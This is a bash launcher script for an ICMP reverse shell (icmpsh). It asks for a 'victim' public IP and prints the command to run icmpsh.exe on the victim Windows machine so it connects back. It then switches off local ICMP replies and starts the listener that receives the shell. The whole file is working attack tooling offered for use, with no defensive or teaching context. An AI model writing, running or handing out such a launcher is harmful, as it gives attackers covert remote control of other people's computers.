#!/bin/bash

IPINT=$(sudo ifconfig | grep "eth" | cut -d " " -f 1 | head -1)
IP=$(sudo ifconfig "$IPINT" |grep "inet addr:" |cut -d ":" -f 2 |awk '{ print $1 }')

echo -e "What is the victims public IP address? \c"
read VICTIM

echo "On the Victim Windows system run the following command once the below listener has started:"
echo -e "\ticmpsh.exe -t \"$IP\" -d 500 -b 30 -s 128"

echo -e "\nDisabling ICMP replies locally, please wait..."
sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1 >/dev/null
echo -e "\nLaunching icmpsh master, waiting for a connection inbound..."
sudo python icmpsh_m.py "$IP" "$VICTIM"

